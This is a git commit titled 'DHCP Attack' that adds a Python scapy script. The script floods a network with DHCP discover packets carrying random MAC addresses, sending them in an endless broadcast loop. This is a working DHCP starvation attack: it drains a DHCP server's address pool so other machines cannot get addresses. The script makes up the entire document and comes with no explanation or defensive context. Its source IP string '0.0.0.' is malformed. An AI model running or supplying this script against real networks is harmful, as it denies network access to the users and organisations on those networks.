e20e5889ea334fc808f15c1caca0a11f0c53579a
anilceylan <a.ceylan2649@gmail.com>
2023-10-09 20:40:53 +0300

    DHCP Attack

---
+++ Python/DHCP_attack.py
@@ -0,0 +1,13 @@
+from scapy.all import *
+
+conf.checkIPaddr = False
+
+ether_packet = Ether(dst='ff:ff:ff:ff:ff:ff')
+ip_packet = IP(src="0.0.0.", dst="255.255.255.255")
+udp = UDP(sport=68, dport = 67)
+bootp = BOOTP(op=1, chaddr=RandMAC())
+dhcp = DHCP(options=[("message-type","discover"),"end"])
+
+DHCP_packet = ether_packet/ip_packet/udp/bootp/dhcp
+
+sendp(DHCP_packet, iface='eth0', verbose = False, loop=1)
